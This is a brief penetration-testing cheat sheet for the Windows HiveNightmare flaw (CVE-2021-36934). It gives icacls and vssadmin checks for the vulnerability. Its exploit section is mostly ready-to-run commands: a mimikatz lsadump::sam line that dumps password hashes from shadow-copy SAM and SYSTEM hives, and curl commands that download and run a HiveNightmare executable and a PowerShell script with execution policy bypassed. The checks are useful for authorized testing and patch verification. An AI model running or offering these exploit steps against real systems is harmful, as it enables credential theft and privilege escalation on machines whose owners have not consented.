# HiveNightmare - CVE-2021-36934

## Check for the vulnerability

```cmd
icacls %windir%\system32\config\sam
```

Vulnerable if return:

```text
BUILTIN\Users:(I)(RX)
```

### Check for the vulnerability - As admin

```cmd
icacls %windir%\system32\config\*.* /inheritance:e
vssadmin list shadows
```

### Exploit

mimikatz

```cmd
lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SAM
```

Custom tool:

```cmd
curl https://github.com/SecuProject/HiveNightmare/releases/download/1.0.0.0/HiveNightmare.exe -o HiveNightmare.exe -L
HiveNightmare.exe
```

Powershell:

```powershell
curl https://raw.githubusercontent.com/WiredPulse/Invoke-HiveNightmare/main/Invoke-HiveNightmare.ps1 -o Invoke-HiveNightmare.ps1
powershell -ex bypass .\Invoke-HiveNightmare.ps1 -path %temp%
```

## Sources

- <https://news.sophos.com/en-us/2021/07/22/hivenightmare-aka-serioussam-vulnerability-what-to-do/>
- <https://pentestlab.blog/2021/08/16/hivenightmare/>
- <https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934>
